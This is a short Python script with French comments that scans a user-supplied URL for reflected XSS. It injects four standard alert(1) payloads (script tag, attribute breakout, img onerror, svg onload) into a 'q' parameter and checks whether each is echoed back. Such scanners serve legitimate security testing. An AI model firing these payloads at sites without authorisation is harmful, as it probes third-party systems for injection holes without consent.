### Vérification de faille XSS sur site

import requests

# Liste des payloads XSS simples
xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

def check_xss_vulnerability(url):
    print(f"Scanning URL : {url}")
    for payload in xss_payloads:
        # Envoie la requête avec le payload dans le paramètre 'q'
        target_url = f"{url}?q={payload}"
        response = requests.get(target_url)
        
        # Vérifie si le payload est présent dans la réponse
        if payload in response.text:
            print(f"Vulnérabilité XSS détectée avec le payload : {payload}")
        else:
            print(f"Aucune vulnérabilité détectée pour le payload : {payload}")

if __name__ == "__main__":
    target_url = input("Entrez l'URL à scanner (ex: http://example.com/search): ")
    check_xss_vulnerability(target_url)
